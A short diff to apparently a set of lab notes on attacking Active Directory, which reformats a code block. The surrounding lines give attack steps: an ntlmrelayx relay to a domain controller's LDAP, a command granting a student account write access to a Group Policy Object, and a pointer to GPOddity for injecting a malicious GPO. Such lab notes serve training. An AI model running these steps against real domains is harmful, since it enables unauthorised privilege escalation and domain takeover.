@@ -150,9 +150,9 @@ sudo ntlmrelayx.py -t ldap://dcorp-dc.dollarcorp.moneycorp.local --http-port '80
 ```
 
 Use netcat to connect to the interactive session and use the below to add the user to have write access to the GPO.
-
-<pre class="language-aspnet"><code class="lang-aspnet"><strong>write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
-</strong></code></pre>
+```batch
+write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
 
 Now malicious GPO template can injected through GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
 
